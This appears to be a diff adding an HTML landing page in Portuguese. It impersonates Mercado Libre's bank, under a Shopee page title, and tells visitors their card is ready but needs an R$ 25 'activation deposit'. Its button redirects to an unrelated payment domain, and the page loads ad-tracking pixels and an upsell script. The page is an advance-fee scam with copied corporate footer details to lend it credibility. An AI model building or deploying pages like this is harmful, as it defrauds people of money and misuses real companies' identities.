@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    <script>
+  window.googlePixelId = "694a28d20933edb83f74a17a";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee - Ativação de Conta</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.08);
+            max-width: 420px;
+            width: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .header {
+            background: white;
+            padding: 32px 24px;
+            text-align: center;
+            position: relative;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .logo {
+            display: inline-block;
+            position: relative;
+        }
+        
+        .logo img {
+            height: 40px;
+            width: auto;
+        }
+        
+        .content {
+            padding: 32px 24px;
+        }
+        
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #22c55e;
+            text-align: center;
+            margin-bottom: 16px;
+            line-height: 1.3;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #6b7280;
+            text-align: center;
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+        
+        .amount {
+            font-size: 18px;
+            font-weight: 600;
+            color: #22c55e;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .highlight-box {
+            background: linear-gradient(135deg, #fff9c4 0%, #fef3c7 100%);
+            border: 1px solid #fbbf24;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 32px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .highlight-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #f59e0b 0%, #fbbf24 100%);
+        }
+        
+        .highlight-text {
+            color: #78350f;
+            font-size: 15px;
+            line-height: 1.6;
+            font-weight: 500;
+            text-align: center;
+        }
+        
+        .highlight-important {
+            color: #92400e;
+            font-weight: 600;
+        }
+        
+        .features-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 32px;
+        }
+        
+        .features-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a1a1a;
+            text-align: center;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .features-title::before,
+        .features-title::after {
+            content: '';
+            width: 40px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent 0%, #ffe600 50%, transparent 100%);
+        }
+        
+        .features-list {
+            list-style: none;
+            space-y: 12px;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .feature-item:last-child {
+            border-bottom: none;
+        }
+        
+        .feature-icon {
+            width: 24px;
+            height: 24px;
+            background: #ffe600;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        
+        .feature-icon::after {
+            content: '✓';
+            color: black;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .feature-text {
+            color: #4b5563;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .activation-section {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .activation-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 20px;
+        }
+        
+        .deposit-card {
+            background: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 24px;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        .deposit-card:hover {
+            border-color: #ffe600;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 217, 0, 0.15);
+        }
+        
+        .deposit-illustration {
+            margin-bottom: 16px;
+            position: relative;
+        }
+        
+        .deposit-illustration img {
+            height: 120px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        .deposit-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #22c55e;
+            margin-bottom: 24px;
+        }
+        
+        .cta-button {
+            background: #ffe600;
+            color: black;
+            border: none;
+            border-radius: 50px;
+            padding: 16px 40px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            width: auto;
+            display: inline-block;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            margin: 0 auto;
+            text-align: center;
+        }
+        
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .cta-button:hover::before {
+            left: 100%;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 217, 0, 0.4);
+            background: #E6C300;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 24px;
+            color: #a0aec0;
+            font-size: 12px;
+            line-height: 1.5;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .footer-line {
+            margin-bottom: 4px;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                margin: 10px;
+                border-radius: 20px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+            
+            .content {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <img src="https://www.Mercado Librebank.com.br/images/logo/logo-Mercado Libre-bank.svg" alt="" style="height: 40px; width: auto;" />
+            </div>
+        </div>
+        
+        <div class="content">
+            <h1 class="title">Parabéns! Seu cartão está pronto</h1>
+            <p class="subtitle">Para ativar sua conta e usar seu cartão virtual,</p>
+            <p class="amount">é necessário um depósito mínimo de <strong>R$ 25</strong></p>
+            
+            <div class="highlight-box">
+                <p class="highlight-text">
+                    Este valor não é para nós, ele ficará na sua conta e você poderá usá-lo como quiser assim que tiver acesso ao aplicativo. 
+                    <span class="highlight-important">Sem esse depósito, não conseguiremos enviar o cartão!</span>
+                </p>
+            </div>
+            
+            <div class="features-card">
+                <h3 class="features-title">Conta Digital</h3>
+                <ul class="features-list">
+                    <li class="feature-item">
+                        <div class="feature-icon"></div>
+                        <span class="feature-text">Pix 24 horas</span>
+                    </li>
+                    <li class="feature-item">
+                        <div class="feature-icon"></div>
+                        <span class="feature-text">Pagamento de boletos</span>
+                    </li>
+                    <li class="feature-item">
+                        <div class="feature-icon"></div>
+                        <span class="feature-text">Cartão Virtual</span>
+                    </li>
+                    <li class="feature-item">
+                        <div class="feature-icon"></div>
+                        <span class="feature-text">Saques em caixas eletrônicos</span>
+                    </li>
+                    <li class="feature-item">
+                        <div class="feature-icon"></div>
+                        <span class="feature-text">Atendimento ao cliente 24/7</span>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="activation-section">
+                <h3 class="activation-title">Ative sua conta depositando nela:</h3>
+                
+                <div class="deposit-card">
+                    <div class="deposit-illustration">
+                        <img src="https://i.postimg.cc/9Q1TySq1/maozinha.png" alt=" App" />
+                    </div>
+                    <div class="deposit-amount">R$ 25</div>
+                </div>
+                
+                <button class="cta-button" onclick="redirectToCheckout()">
+                    Ativar minha conta agora
+                </button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-line">Mercado Libre Financeira S.A. Crédito, Financiamento e Investimento - CNPJ nº 23.862.762/0001-00</div>
+            <div class="footer-line">Rua Eugênio de Medeiros, nº 303, 10º andar, Cj. 1001, bairro de Pinheiros, São Paulo-SP, CEP: 05425-000.</div>
+            <div class="footer-line">© 2025 - Todos os direitos reservados</div>
+        </div>
+    </div>
+    <script src="upsells.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+    initUpsell(1);
+    });
+    </script>
+    <script>
+        function redirectToCheckout() {
+            // Redireciona diretamente para checkout.com
+            window.location.href = 'https://pay.creditopraticosimples.com/a6pVgd2KVDBZk7B';
+        }
+    </script>
+</body>
+</html>
